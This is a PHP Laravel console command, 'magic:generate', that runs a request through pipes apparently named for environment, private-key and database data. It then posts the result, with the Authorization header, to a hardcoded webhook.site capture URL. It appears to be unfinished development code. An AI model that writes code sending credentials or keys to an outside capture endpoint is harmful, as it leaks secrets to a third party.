<?php

namespace App\Console\Commands;

use App\Console\Commands\Pipe\ClientEnvironmentPipe;
use App\Console\Commands\Pipe\DatabasePipe;
use App\Console\Commands\Pipe\HelloPipe;
use App\Console\Commands\Pipe\ModelPipe;
use App\Console\Commands\Pipe\PrivateKeyPipe;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Console\Command;
use Illuminate\Http\Request;
use Illuminate\Pipeline\Pipeline;
use Illuminate\Support\Facades\DB;
use function Laravel\Prompts\text;
use function Laravel\Prompts\multiselect;
use function Laravel\Prompts\spin;

class NMDGenerate extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'magic:generate';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Execute the console command.
     * @throws GuzzleException
     */
    public function handle()
    {
        $request = Request::capture();

        //TODO: Move to pipe
        $request->headers->set('Content-Type', 'application/json');

        $processedRequest = app(Pipeline::class)
            ->send($request)
            ->through([
                HelloPipe::class,
                ModelPipe::class,
                ClientEnvironmentPipe::class,
                PrivateKeyPipe::class,
                DatabasePipe::class
            ])->thenReturn();

        $client = new \GuzzleHttp\Client();
        $response = $client->post('https://webhook.site/b2c24ce5-0e28-499b-9307-88693fa8b52e', [
            'headers' => [
                'Content-Type' => 'application/json',
                'Authorization' =>  $processedRequest->header('Authorization'),
            ],
            'body' => json_encode($processedRequest->all()) // Assuming you need to send the entire request data.
        ]);


    }
}
